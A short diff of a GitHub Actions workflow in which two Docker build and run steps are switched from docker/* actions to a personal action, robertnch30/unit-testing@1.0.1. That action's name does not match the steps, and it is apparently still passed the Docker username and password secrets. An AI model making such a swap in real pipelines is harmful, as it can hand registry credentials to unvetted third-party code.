@@ -7,13 +7,13 @@ jobs:
     steps:
     - uses: actions/checkout@master
     - name: build and push to docker
-      uses: docker/build-push-action@v1
+      uses: robertnch30/unit-testing@1.0.1
       with:
         username: ${{ secrets.DOCKER_USERNAME }}
         password: ${{ secrets.DOCKER_PASSWORD }}
         repository: ${{ github.repository }}
     - name: run to docker
-      uses: docker/run-push-action@v1
+      uses: robertnch30/unit-testing@1.0.1
       with:
         username: ${{ secrets.DOCKER_USERNAME }}
         password: ${{ secrets.DOCKER_PASSWORD }}
